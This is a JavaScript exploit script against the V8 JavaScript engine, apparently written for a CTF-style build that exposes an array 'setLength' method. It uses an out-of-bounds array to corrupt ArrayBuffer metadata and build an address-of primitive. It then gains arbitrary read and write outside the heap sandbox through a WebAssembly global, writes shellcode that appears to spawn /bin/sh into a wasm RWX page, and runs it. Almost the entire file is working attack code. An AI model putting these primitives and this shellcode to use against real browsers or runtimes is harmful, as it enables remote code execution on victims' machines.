//This exploit is not accurate. 
//Because of the heap sandbox of the V8, sometimes we may need to use a kind of 32 bit TypedArray to read or write memory
//But we should not use Uint32Array(). Because during the exploitation, we need to convert these Uint32 elements to smi but
//the smi is 31 bits value type, which means that it can't represent 32 bit data accurately.
//Therefore we should avoid using Uint32Array and use Float32Array and BigInt64Array to replace it.


//use the ArrayBuffer to implement the conversion between the u32 and float64
let Convertion = new ArrayBuffer(0x8);
let ConvertionInt32 = new Uint32Array(Convertion);
let ConvertionFloat = new Float64Array(Convertion);
let ConvertionFloat32 = new Float32Array(Convertion);
let ConvertionUint64 = new BigUint64Array(Convertion);
function U32ToF64(src)
{
    ConvertionInt32[0] = src[0]; 
    ConvertionInt32[1] = src[1]; 
    return ConvertionFloat[0];
}
function F64ToU32(src)
{
    ConvertionFloat[0] = src; 
    //return a smi array
    return [ConvertionInt32[0],ConvertionInt32[1]];
} 
function F32ToU32(src)
{
    ConvertionFloat32[0] = src;
    return ConvertionInt32[0];
}
function F32ToF64(src)
{
    ConvertionFloat32[0] = src[0];
    ConvertionFloat32[1] = src[1];
    return ConvertionFloat[0];
}
function U64ToF32(src)
{
    ConvertionUint64[0] = src;
    return [ConvertionFloat32[0], ConvertionFloat32[1]];
}
function F32ToU64(src)
{
    ConvertionFloat32[0] = src[0];
    ConvertionFloat32[1] = src[1];
    return ConvertionUint64[0];
}
//create a wasm (RWX) area
let WasmBytes = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 8, 2, 96, 1, 127, 0, 96, 0, 0, 2, 25, 1, 7, 105, 109, 112, 111, 114, 116, 115, 13, 105, 109, 112, 111, 114, 116, 101, 100, 95, 102, 117, 110, 99, 0, 0, 3, 2, 1, 1, 7, 17, 1, 13, 101, 120, 112, 111, 114, 116, 101, 100, 95, 102, 117, 110, 99, 0, 1, 10, 8, 1, 6, 0, 65, 42, 16, 0, 11]);
let WasmInst = new WebAssembly.Instance(new WebAssembly.Module(WasmBytes), {imports: {imported_func: function(x){ return x; }}});
let WasmFunc = WasmInst.exports.exported_func;
//fill the source string to length n from the lower
function ljust(src, n, c)
{
    if(src.length < n)
    {
        src = c.repeat(n - src.length) + src;
    }
    return src;
}
//fill the source string to length n from the higher
function rjust(src, n, c)
{
    if(src.length < n)
    {
        src = src + c.repeat(n - src.length);
    }
    return src;
}
//Convert a number to a hexadecimal string
//the arg must be a smi array
function tohex64(x)
{
    return "0x" + ljust(x[1].toString(16),8,'0') + ljust(x[0].toString(16),8,'0');
}

function opt()
{
    return [1.1,2.2,3.3];
}

//The default type of this origin_offset is F32 and
// the default type of the return value is an array of two F32
function ArrayBufferAddressCount(origin_offset, js_base)
{
    var tmp = F32ToU64([origin_offset, 0]);
    tmp = tmp << 8n;
    var js_base_u64 = F32ToU64(js_base);
    var result = tmp + js_base_u64;
    return U64ToF32(result);
    
}

var OOB_array = [1.1, 2.2, 3.3];
var tmp = new ArrayBuffer(0x10);


OOB_array.setLength(0x10000000);

 //give a large size to this ArrayBuffer
var origin_length = F64ToU32(OOB_array[6]);
var new_length = U32ToF64([origin_length[0], 0x80000000]);
OOB_array[6] = new_length;

OOB_array[0x7] = U32ToF64([0x00000000,0x80000000]);

//set the base point of this ArrayBuffer to the start of the sandbox
//in this case, this ArrayBuffer can use its large size to access the whole heap sandbox.
var origin_offset = F64ToU32(OOB_array[9]);
var new_offset = U32ToF64([0x00000000,origin_offset[1]]);
OOB_array[0x9] = new_offset; 


var victim = new Float32Array(tmp);

var OOB_array_ = new Array(1.1,2.2);
OOB_array_.setLength(0x10000000);
var address_of_helper = {a: 0x12345678, b : 0x23456789, c: 0x41414141};



var iteration_offset = 0;
var helper_offset = 0
while(true){

    if((F64ToU32(OOB_array_[iteration_offset])[0] == 0x2468acf0) && 
        (F64ToU32(OOB_array_[iteration_offset])[1] == 0x468acf12))
    {
        helper_offset = iteration_offset;
        break;
    }
    else if((F64ToU32(OOB_array_[iteration_offset])[1] == 0x2468acf0) && 
        (F64ToU32(OOB_array_[iteration_offset + 1])[0] == 0x468acf12))
    {
        helper_offset = iteration_offset;
        break;
    }
    else
        iteration_offset += 1;
    

}

console.log("[+] the offset of the helper is: " + helper_offset);



function address_of(object)
{
    address_of_helper['c'] = object;
    var tmp = F64ToU32(OOB_array_[helper_offset + 1])[1];
    return tmp;
}

//Create a new wasm instance to get an arbitrary write out of the sandbox
var fake_global_buffer = new Float32Array(new ArrayBuffer(0x10));
var wasm_code = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 9, 2, 96, 0, 1, 126, 96, 1, 126, 0, 2, 15, 1, 3, 101, 110, 118, 6, 103, 108, 111, 98, 97, 108, 3, 126, 1, 3, 3, 2, 0, 1, 7, 27, 2, 10, 103, 101, 116, 95, 103, 108, 111, 98, 97, 108, 0, 0, 10, 115, 101, 116, 95, 103, 108, 111, 98, 97, 108, 0, 1, 10, 16, 2, 4, 0, 35, 0, 11, 9, 0, 32, 0, 66, 0, 124, 36, 0, 11]);
var new_wasm_module = new WebAssembly.Module(wasm_code);
//all the secrets are stored in this wasm_instance
//global_start and the address of the rwx region
const global = new WebAssembly.Global({value:'i64', mutable:true}, 0x414141n);
var new_wasm_instance = new WebAssembly.Instance(new_wasm_module, {env:{global}});

//get the offset of the wasm_instance
var executable_wasm_instance_address = address_of(WasmInst) - 1;
var rw_wasm_instance_address = address_of(new_wasm_instance) - 1;
console.log("[+] the offset of the executable_wasm_instance is: " + executable_wasm_instance_address);
console.log("[+] the offset of the rw_wasm_instance_address  is: " + rw_wasm_instance_address);

var rwx_region_offset = executable_wasm_instance_address + 0x60;
var import_global_buffer_offset = rw_wasm_instance_address + 0x50;

function arbitrary_read_32(address)
{
    victim[import_global_buffer_offset / 4] = address[0];
    victim[import_global_buffer_offset / 4 + 1] = address[1];
    return new_wasm_instance.exports.get_global();
}

function arbitrary_write_64(address, value)
{
    victim[import_global_buffer_offset / 4] = address[0];
    victim[import_global_buffer_offset / 4 + 1] = address[1];
    new_wasm_instance.exports.set_global(BigInt(value));
}


var rwx_address = [];
rwx_address[0] = victim[rwx_region_offset / 4];
rwx_address[1] = victim[rwx_region_offset / 4 + 1];

console.log("[+] the address of the wasm rwx region is:" + tohex64([F32ToU32(rwx_address[0]), F32ToU32(rwx_address[1])]));


var shellcode = new Uint32Array([0x622fb848, 0x732f6e69, 0x50990068, 0x66525f54, 0x54632d68, 0x05e8525e, 0x62000000, 0x00687361, 
    0x5e545756, 0x0f583b6a, 0x00000005, 0x0]);
var shellcode_64 = new BigUint64Array(shellcode.buffer);


var js_base = [];
js_base[0] = 0;
js_base[1] = victim[7];
console.log("[+] the address of js_base is: " + tohex64([F32ToU32(js_base[0]), F32ToU32(js_base[1])]));


fake_global_buffer[0] = rwx_address[0];
fake_global_buffer[1] = rwx_address[1];
var offset_of_fake_global_buffer = address_of(fake_global_buffer) - 1;
var offset = victim[(offset_of_fake_global_buffer + 0x30) / 4];

var address_of_fake_global_buffer = ArrayBufferAddressCount(offset, js_base);

console.log('[+] the address of the fake global_buffer is : ' + tohex64([F32ToU32(address_of_fake_global_buffer[0]), F32ToU32(address_of_fake_global_buffer[1])]));

for(var i = 0; i < shellcode_64.length; i++){
    arbitrary_write_64(address_of_fake_global_buffer, shellcode_64[i]);
    fake_global_buffer[0] = U64ToF32(F32ToU64([fake_global_buffer[0], fake_global_buffer[1]]) + BigInt(8))[0];
}

console.log("[+] get shell!!");

WasmInst.exports.exported_func();
